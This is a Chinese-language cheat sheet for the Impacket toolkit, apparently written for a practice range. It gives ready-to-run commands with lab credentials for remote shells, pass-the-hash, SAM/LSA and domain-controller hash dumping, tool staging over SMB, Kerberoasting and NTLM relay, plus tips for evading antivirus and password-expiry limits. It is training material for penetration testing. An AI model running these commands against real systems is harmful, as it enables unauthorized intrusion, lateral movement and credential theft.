Impacket 是一套由 Python 编写的**Windows 网络协议工具集**，原生支持 SMB、WMI、Kerberos、LDAP、DCOM 等多种协议，是域渗透、横向移动、凭证提取的标配工具，也是红日这类靶场的核心工具之一。它最大的优势是**无需向目标机上传任何工具**，远程即可完成命令执行、凭证抓取、文件操作。

---
## 一、通用账号格式
所有工具的认证格式统一，遵循以下规则：

| 认证方式 | 格式 |
| :--- | :--- |
| 本地账号明文 | `用户名:密码@目标IP` |
| 域账号明文 | `域名/用户名:密码@目标IP` |
| 哈希传递（PTH） | `-hashes :NTLM哈希 域名/用户名@目标IP` |

> [!warning] 注意事项
>  Linux 环境下，密码包含 `!`、`$`、`@` 等特殊字符时，**必须用单引号把密码整体包裹**，否则会被 Bash 解析导致认证失败。
>  正确示例：`DE1AY/Administrator:'2wsx!QAZ'@192.168.242.75`

---
## 二、核心工具分类详解
### （一）远程命令执行（横向移动核心）
对应 445 端口开放的场景，是最常用的一类工具，作用是远程获取目标主机的命令行 Shell。
#### 1. smbexec.py
- **原理**：纯 SMB 协议实现，通过 SMB 命名管道执行命令，不创建系统服务
- **依赖端口**：仅 445 端口
- **特点**：半交互式 Shell，隐蔽性比 psexec 好，且属于**网络登录类型**，大概率可以绕过「密码过期」的交互式登录限制
- **命令示例**：
```bash
# 明文密码登录
python smbexec.py DE1AY/Administrator:'2wsx!QAZ'@192.168.242.69 -codec cp936

# 哈希传递登录（完全绕开密码有效期）
python smbexec.py -hashes :cf83cd7efde13e0ce754874aaa979a74 DE1AY/Administrator@192.168.242.75
```
#### 2. psexec.py（经典高权限）
- **原理**：模拟微软 PsExec，通过 SMB 上传并创建远程系统服务执行命令
- **依赖端口**：445 端口
- **特点**：默认直接返回 **System 权限**的完整交互式 Shell，权限最高；但会创建服务，日志痕迹明显
- **命令示例**：
```bash
python psexec.py DE1AY/Administrator:'2wsx!QAZ'@192.168.242.75
```
#### 3. wmiexec.py（隐蔽备选）
- **原理**：通过 WMI 服务执行命令，执行结果通过 SMB 管道返回
- **依赖端口**：135（WMI 服务） + 445（结果返回）
- **特点**：不创建服务、不落地文件，隐蔽性更强；如果目标 135 端口开放，可以作为备选方案
- **命令示例**：
```bash
python wmiexec.py DE1AY/Administrator:'2wsx!QAZ'@192.168.242.75
```
#### 4. dcomexec.py（冷门绕过）
- **原理**：通过 DCOM 组件调用执行命令
- **依赖端口**：135 + 动态高位端口
- **特点**：当 SMB、WMI 都被拦截时使用，属于偏门的绕过方案

---
### （二）凭证提取（远程 Dump，替代 mimikatz 落地）
核心工具是 `secretsdump.py`，可以**远程从目标主机内存、注册表、域控数据库中提取所有凭证**，不需要往目标机上传 mimikatz，避免被杀软查杀。
#### 1. 提取目标机本地所有凭证（SAM + LSA）
对应本地 mimikatz 的 `lsadump::sam` + `lsadump::secrets` 功能：
```bash
python secretsdump.py DE1AY/Administrator:'2wsx!QAZ'@192.168.242.75
```
执行后会直接输出：
- 本地所有账号的 NTLM 哈希
- 系统缓存的 LSA 机密、服务账号密码
- 缓存的域登录凭据
#### 2. 转储域控所有账号哈希（NTDS.dit）
如果目标是域控制器，一条命令导出整个域所有账号的哈希：
```bash
python secretsdump.py DE1AY/Administrator:'2wsx!QAZ'@域控IP -just-dc
```
#### 3. 哈希传递模式提取
密码过期时，直接用哈希远程 dump：
```bash
python secretsdump.py -hashes :cf83cd7efde13e0ce754874aaa979a74 DE1AY/Administrator@192.168.242.75
```

---
### （三）SMB 文件操作与传输
#### 1. smbclient.py（远程 SMB 共享操作）
类似 FTP 客户端，用来浏览、下载、上传目标主机的 SMB 共享文件：
```bash
python smbclient.py DE1AY/Administrator:'2wsx!QAZ'@192.168.242.75
```
进入交互界面后常用命令：
- `shares`：列出所有共享目录
- `use 共享名`：进入指定共享
- `ls` / `cd`：浏览目录
- `get 文件名`：下载文件到本地
- `put 本地文件名`：上传文件到目标

#### 2. smbserver.py（本地搭建 SMB 共享）
靶场神器，快速在本地搭建一个 SMB 共享服务器，用来给目标机传工具、拖取文件，不需要 FTP 等额外服务：
```bash
# 语法：python3 smbserver.py 共享名 本地文件夹路径
python smbserver.py tools /root/tools
```
执行后，目标机可以直接通过 `\\你的IP\tools` 访问你的本地文件，直接复制运行。

---
### （四）域渗透进阶工具
| 工具 | 功能 | 用途 |
| :--- | :--- | :--- |
| `GetNPUsers.py` | AS-REP Roasting 攻击 | 枚举域内「不需要 Kerberos 预认证」的用户，导出其哈希爆破 |
| `GetUserSPNs.py` | Kerberoasting 攻击 | 请求域内服务账号的服务票据（ST），破解获取服务账号明文密码 |
| `lookupsid.py` | SID 枚举 | 通过 SID 爆破枚举目标主机/域内的所有账号名 |
| `ntlmrelayx.py` | NTLM 中继攻击 | 中继 NTLM 认证，横向拿下其他主机权限 |

---

## 三、账号密码正确但密码过期
当「445 端口开放、账号密码正确但 RDP 提示密码过期」的情况时，按优先级操作：
1. **优先执行 smbexec.py**：纯 445 端口 + 网络登录类型，90% 概率可以绕过密码过期限制，直接拿到命令行
2. **如果 smbexec 也提示密码过期**：直接用哈希传递模式执行，完全绕开密码有效期校验
3. **不需要 Shell 只想拿凭证**：直接运行 `secretsdump.py`，远程一键 dump 目标机所有哈希，比上传 mimikatz 更高效
4. **需要传工具到目标机**：本地用 `smbserver.py` 搭共享，目标机直接通过 UNC 路径访问执行

---

## 四、常见踩坑点
1. **特殊字符报错**：Linux 下密码里的 `!` 会被 Bash 识别为历史命令，必须用单引号包裹密码
2. **域账号格式错误**：必须加 `域名/` 前缀，否则系统会默认尝试登录目标机的本地账号
3. **哈希格式错误**：`-hashes` 参数的格式是 `:NTLM哈希`，前面的冒号不能省略（对应 LM 哈希为空）
4. **权限不足**：所有远程执行、凭证提取工具都需要目标管理员权限，普通用户会直接报错
5. **防火墙拦截**：445 端口被防火墙拦截时，所有 SMB 系工具都会失效，需要切换 WMI、DCOM 等其他协议
